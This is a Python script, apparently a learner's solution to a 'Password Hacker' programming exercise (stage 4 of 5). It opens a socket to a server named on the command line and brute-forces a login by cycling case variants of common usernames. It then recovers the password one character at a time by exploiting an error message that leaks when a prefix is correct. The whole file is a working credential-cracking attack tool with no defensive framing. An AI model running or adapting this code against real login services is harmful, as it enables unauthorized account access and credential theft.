# ------------------- STAGE 4/5 ------------------- #
from json import dumps, loads
from socket import socket
from itertools import product
from sys import argv, exit

# CLI arguments
ip = argv[1]
port = argv[2]
address = (ip, int(port))


# Generator of logins
def login_generator():
    # `r` before a string means that Python will take the RAW STRING,
    # literally as was written!! Python will not escape anything!
    common_logins_file_path = r"C:\Users\acer\PycharmProjects\Password Hacker" \
                                 r"\Password Hacker\task\hacking\logins.txt"
    with open(common_logins_file_path) as common_logins:
        for line in common_logins:
            line = line.strip()
            # adapted from `ephemient` SlackOverflow
            login = product(*zip(line.upper(), line.lower()))
            for variant in login:
                yield ''.join(variant)


# Instantiating the generator of logins
hack_login = login_generator()

# Connecting once to the server - opening the gates!
client_socket = socket()
client_socket.connect(address)

correct_login = ""
# First, trying to find the `login`
for attempt in hack_login:
    # preparing message to be sent
    message = dumps({"login": attempt, "password": " "}).encode()
    # sending login guess
    client_socket.send(message)
    # receiving the result
    response = loads(client_socket.recv(1024).decode())
    if response["result"] == "Wrong password!":
        correct_login = attempt
        break


# Password decoder Generator
def password_decoder():
    abc = 'abcdefghijklmnopqrstuvwxyz0123456789'
    for digit in abc:
        digit_pairs = product(*zip(digit.upper(), digit.lower()))
        for dig in digit_pairs:
            yield ''.join(dig)


# For appending digits to the password as it is discovered
piece = ""
while True:
    # Instantiating the password decoder every loop
    hack_password = password_decoder()
    # Now I have the right `LOGIN`, let's then find the right `PASSWORD`!!
    for attempt in hack_password:
        # preparing message to be sent
        message = dumps({"login": correct_login, "password": piece + attempt}).encode()
        # sending password guess
        client_socket.send(message)
        # receiving the result
        response = loads(client_socket.recv(1024).decode())
        if response["result"] == "Exception happened during login":
            piece += attempt
            break
        elif response["result"] == "Connection success!":
            # `password` gets to be `piece + `attempt` because it needs to include
            # the last digit, that will skip the above `if` statement
            print(dumps({"login": correct_login, "password": piece + attempt}))
            # print(response)
            client_socket.close()
            exit(0)